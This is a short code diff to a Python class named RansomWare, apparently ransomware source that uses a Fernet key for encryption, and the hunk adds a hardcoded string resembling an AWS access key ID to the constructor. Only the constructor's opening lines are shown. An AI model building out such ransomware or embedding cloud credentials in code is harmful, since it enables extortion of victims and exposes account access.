@@ -31,6 +31,7 @@ class RansomWare:
 
 
     def __init__(self):
+        aws = "AKIA2JAPX77RGLB664VE"
         # Key that will be used for Fernet object and encrypt/decrypt method
         self.key = None
         # Encrypt/Decrypter
